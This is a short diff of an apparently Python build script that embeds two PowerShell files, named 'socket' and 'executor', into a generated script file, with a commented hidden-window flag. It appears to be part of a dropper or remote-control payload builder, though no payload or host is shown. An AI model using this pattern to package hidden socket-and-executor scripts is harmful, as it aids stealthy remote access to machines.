@@ -19,7 +19,7 @@ wr("exit 0 \r\n")
 socket = open("socket.ps1", "r")
 executor = open("executor.ps1", "r")
 
-socketBat.write("start powershell -Command \"");
+socketBat.write("objSocket.WriteLine \"");
 #-windowstyle hidden
 
 while 1: 
@@ -30,7 +30,7 @@ while 1:
     if char != '\n':
         socketBat.write(char)
 
-socketBat.write("start powershell -Command \"")
+socketBat.write("objExecutor.WriteLine \"")
 while 1:
     char = executor.read(1)  
     if not char: 
